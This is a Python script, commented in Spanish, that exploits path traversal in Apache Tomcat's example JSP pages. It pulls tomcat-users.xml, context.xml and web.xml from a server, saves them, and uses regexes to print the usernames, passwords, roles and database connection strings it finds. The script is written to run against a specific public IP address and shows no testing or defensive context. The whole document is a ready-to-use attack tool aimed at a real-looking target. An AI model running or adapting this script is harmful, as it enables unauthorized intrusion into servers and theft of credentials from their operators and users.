import requests
import re

class ConfigExtractor:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
    
    def extract_via_examples(self):
        """Extraer configuraciones via ejemplos vulnerables"""
        print("[+] Extrayendo configuraciones via /examples/...")
        
        # Patrones de archivos de configuración
        config_files = {
            'tomcat-users.xml': [
                '/examples/jsp/include/include.jsp?page=../../../../conf/tomcat-users.xml',
                '/examples/jsp/cal/cal2.jsp?time=../../../../conf/tomcat-users.xml'
            ],
            'context.xml': [
                '/examples/jsp/include/include.jsp?page=../../../../conf/context.xml',
                '/examples/jsp/include/include.jsp?page=../../../../META-INF/context.xml'
            ],
            'web.xml': [
                '/examples/jsp/include/include.jsp?page=../../../../WEB-INF/web.xml'
            ]
        }
        
        for config_file, urls in config_files.items():
            for url_path in urls:
                full_url = self.target + url_path
                try:
                    response = self.session.get(full_url, timeout=10)
                    if response.status_code == 200 and '<?xml' in response.text:
                        print(f"[ÉXITO] {config_file} encontrado!")
                        
                        # Guardar archivo
                        filename = f"extracted_{config_file}"
                        with open(filename, 'w', encoding='utf-8') as f:
                            f.write(response.text)
                        print(f"[+] Guardado como: {filename}")
                        
                        # Extraer información sensible
                        self.analyze_config(config_file, response.text)
                        break
                except Exception as e:
                    continue
    
    def analyze_config(self, filename, content):
        """Analizar configuración para información sensible"""
        if 'tomcat-users.xml' in filename:
            self.extract_credentials(content)
        elif 'web.xml' in filename:
            self.extract_db_config(content)
    
    def extract_credentials(self, xml_content):
        """Extraer credenciales de tomcat-users.xml"""
        print("\n[ANALIZANDO CREDENCIALES]")
        
        # Patrón regex para usuarios
        pattern = r'username="([^"]*)"\s+password="([^"]*)"\s+roles="([^"]*)"'
        matches = re.findall(pattern, xml_content)
        
        if matches:
            for user, password, roles in matches:
                print(f"🎯 USUARIO: {user}")
                print(f"🔑 PASSWORD: {password}") 
                print(f"👥 ROLES: {roles}")
                print("-" * 40)
        else:
            print("[-] No se encontraron credenciales en el formato esperado")
            # Búsqueda alternativa
            if 'password' in xml_content:
                print("[!] Contenido con información de password:")
                lines = xml_content.split('\n')
                for line in lines:
                    if 'user' in line.lower() or 'password' in line.lower():
                        print(f"   {line.strip()}")
    
    def extract_db_config(self, web_xml_content):
        """Extraer configuración de base de datos de web.xml"""
        print("\n[BUSCANDO CONFIGURACIÓND DE BD]")
        
        # Patrones comunes de configuración de BD
        db_patterns = [
            r'jdbc:mysql://([^"]+)',
            r'jdbc:oracle:thin:@([^"]+)',
            r'username=([^"]+)',
            r'password=([^"]+)',
            r'<param-name>([^<]+)</param-name><param-value>([^<]+)</param-value>'
        ]
        
        for pattern in db_patterns:
            matches = re.findall(pattern, web_xml_content, re.IGNORECASE)
            if matches:
                print(f"Configuración encontrada ({pattern}):")
                for match in matches:
                    print(f"   {match}")

# Ejecutar extractor
extractor = ConfigExtractor("http://189.254.143.102")
extractor.extract_via_examples()